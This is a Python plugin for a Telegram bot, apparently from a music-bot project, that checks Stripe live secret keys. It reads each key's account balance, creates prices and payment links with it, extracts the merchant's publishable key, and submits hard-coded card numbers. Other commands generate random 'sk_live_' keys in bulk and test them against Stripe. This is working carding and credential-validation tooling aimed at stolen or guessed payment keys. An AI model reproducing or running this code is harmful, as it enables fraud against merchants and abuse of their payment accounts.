# -----------------------------------------------
# 🔸 StrangerMusic Project
# 🔹 Developed & Maintained by: Shashank Shukla (https://github.com/itzshukla)
# 📅 Copyright © 2022 – All Rights Reserved
#
# 📖 License:
# This source code is open for educational and non-commercial use ONLY.
# You are required to retain this credit in all copies or substantial portions of this file.
# Commercial use, redistribution, or removal of this notice is strictly prohibited
# without prior written permission from the author.
#
# ❤️ Made with dedication and love by ItzShukla
# -----------------------------------------------
import os
import requests
import random
import string
from pyrogram import filters
from SHUKLAMUSIC import app as Checker
from config import BOT_USERNAME
import time
import re
import time
import requests
from requests.auth import HTTPBasicAuth
from pyrogram import Client, filters, enums


async def retrieve_balance(sk):
    bln = "https://api.stripe.com/v1/balance"
    auth = HTTPBasicAuth(sk, '')
    res = requests.get(bln, auth=auth)
    return res.json()

async def retrieve_publishable_key_and_merchant(sk):
    price_url = "https://api.stripe.com/v1/prices"
    headers = {"Authorization": f"Bearer {sk}"}
    price_data = {
        "currency": "usd",
        "unit_amount": 1000,
        "product_data[name]": "Gold Plan"
    }
    price_res = requests.post(price_url, headers=headers, data=price_data)
    
    if price_res.status_code != 200:
        price_error = price_res.json().get('error', {})
        error_code = price_error.get('code', '')
        error_message = price_error.get('message', '')
        error_type = price_error.get('type', 'error')

        if error_code == 'api_key_expired' or error_message.startswith('Invalid API Key provided'):
            raise Exception(f"{error_code}: {error_message}")
        
        raise Exception(f"{error_type}: {error_message}")

    price_id = price_res.json()["id"]

    payment_link_url = "https://api.stripe.com/v1/payment_links"
    payment_link_data = {
        "line_items[0][quantity]": 1,
        "line_items[0][price]": price_id
    }
    payment_link_res = requests.post(payment_link_url, headers=headers, data=payment_link_data)
    if payment_link_res.status_code != 200:
        payment_link_error = payment_link_res.json().get('error', {})
        error_code = payment_link_error.get('code', '')
        error_message = payment_link_error.get('message', '')
        
        if error_code == 'payment_link_no_valid_payment_methods':
            return None, None
        
        raise Exception(f"Failed to create payment link: {payment_link_res.text}")

    payment_link = payment_link_res.json()["url"]
    payment_link_id = payment_link.split("/")[-1]

    merchant_ui_api_url = f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}"
    merchant_res = requests.get(merchant_ui_api_url)
    if merchant_res.status_code != 200:
        raise Exception(f"Failed to retrieve publishable key and merchant: {merchant_res.text}")
    merchant_data = merchant_res.json()
    publishable_key = merchant_data.get("key")
    merchant = merchant_data.get("merchant")

    return publishable_key, merchant

async def check_status(message, sk, user_id):
    tic = time.perf_counter()

    try:
        publishable_key, merchant = await retrieve_publishable_key_and_merchant(sk)
    except Exception as e:
        error_message = str(e)
        if 'api_key_expired' in error_message:
            r_text = "𝗔𝗣𝗜 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
            publishable_key, merchant = None, None
        elif 'Invalid API Key provided' in error_message:
            r_text = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗣𝗜 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
            publishable_key, merchant = None, None
        elif 'payment_link_no_valid_payment_methods' in error_message:
            r_text = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
            r_warning = '𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌'
            publishable_key, merchant = None, None
        else:
            publishable_key, merchant = None, None

    bal_dt = await retrieve_balance(sk)
    try:
        avl_bln = bal_dt['available'][0]['amount'] / 100
        pnd_bln = bal_dt['pending'][0]['amount'] / 100
        crn = bal_dt['available'][0]['currency']
    except KeyError:
        txtx = f"""
[ϟ] 𝗦𝗞 ➜
<code>{sk}</code>
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗗𝗲𝗮𝗱 𝗞𝗲𝘆 ❌
[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{message.from_user.first_name}</a>
"""
        return txtx

    if publishable_key and merchant:
        chk = "https://api.stripe.com/v1/payment_methods"
        data = f'type=card&card[number]=5425430190132501&card[exp_month]=12&card[exp_year]=2027&card[cvc]=963&key={publishable_key}&_stripe_account={merchant}'
        rep = requests.post(chk, data=data)
        repp = rep.text

        if 'rate_limit' in repp:
            r_text = '𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧⚠️'
            r_warning = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
        elif 'pm_' in repp:
            r_text = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
            r_warning = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
        elif 'Invalid API Key provided' in repp:
            r_text = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗣𝗜 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
        elif 'You did not provide an API key.' in repp:
            r_text = "𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
            r_warning = '𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌'
        elif 'testmode_charges_only' in repp or 'test_mode_live_card' in repp:
            r_text = "𝗧𝗘𝗦𝗧 𝗠𝗢𝗗𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗢𝗡𝗟𝗬 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
        elif 'api_key_expired' in repp:
            r_text = "𝗔𝗣𝗜 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
        else:
            r_text = "𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌"
            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
    else:
        r_text = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
        r_warning = '𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌'

    toc = time.perf_counter()

    txtxtx = f"""
{r_warning}

[ϟ] 𝗦𝗞 ➜ 
<code>{sk}</code>
[ϟ] 𝗣𝘂𝗯𝗹𝗶𝘀𝗵𝗮𝗯𝗹𝗲 𝗞𝗲𝘆 : <code>{publishable_key if publishable_key else 'Not Available'}</code>
[ϟ] 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{merchant if merchant else 'Not Available'}</code>
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {r_text}
[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 : <b>{crn}</b>
[ϟ] 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : <b>{avl_bln}$</b>
[ϟ] 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : <b>{pnd_bln}$</b>
[ϟ] 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : <b><code>{toc - tic:.2f}</code> Seconds</b>

[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{message.from_user.first_name}</a>
"""

    return txtxtx

@Checker.on_message(filters.command("sk", prefixes="."))
async def sk_checker(client, message):
    ttt = message.text
    skm = re.search(r"sk_live_[a-zA-Z0-9]+", ttt)
    if not skm:
        await message.reply("Please provide a valid secret key.")
        return

    sk = skm.group(0)
    user_id = message.from_user.id
    response = await check_status(message, sk, user_id)
    await message.reply(response, parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)



def generate_stripe_secret_key(prefix='sk_live_', middle_length=65, suffix_length=21):
    characters = string.ascii_letters + string.digits
    middle_segment = ''.join(random.choice(characters) for _ in range(middle_length))
    suffix_segment = ''.join(random.choice(characters) for _ in range(suffix_length))
    return f"{prefix}{middle_segment}{suffix_segment}"

def generate_multiple_keys(num_keys):
    return [generate_stripe_secret_key() for _ in range(num_keys)]


@Checker.on_message(filters.command("gensklong"))
async def long_genskey(client, message):
    command_parts = message.text.split()
    
    if len(command_parts) > 1 and command_parts[1].isdigit():
        num = int(command_parts[1])
        keys = generate_multiple_keys(num)
        filename = f"{num}_SK_Generated_By_@{BOT_USERNAME}.txt"
    
        with open(filename, 'w') as file:
            for key in keys:
                file.write(key + '\n')

        await message.reply_document(document=filename, caption=f"Generated {num} Stripe secret keys")
        os.remove(filename)
    else:
        num = 1
        keys = generate_multiple_keys(num)
        await message.reply_text(f'`{keys[0]}`')


@Checker.on_message(filters.command("gensk short"))
async def short_genskey(_, message):
    skkey = "sk_live_" + ''.join(random.choices(string.digits + string.ascii_letters, k=24))
    start_time = time.time()
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    end_time = time.time()
    duration = end_time - start_time

    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined":
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺ @SapnaMusicRobot
""")
    else:
        await message.reply(f"""
┏━━━━━━━⍟
┃𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
┗━━━━━━━━━━━⊛

⊗ 𝗦𝗞 ➺ `{skkey}`
⊗ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅
⊗ 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : {duration:.2f} seconds

⊗ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➺ @SapnaMusicRobot
""")
        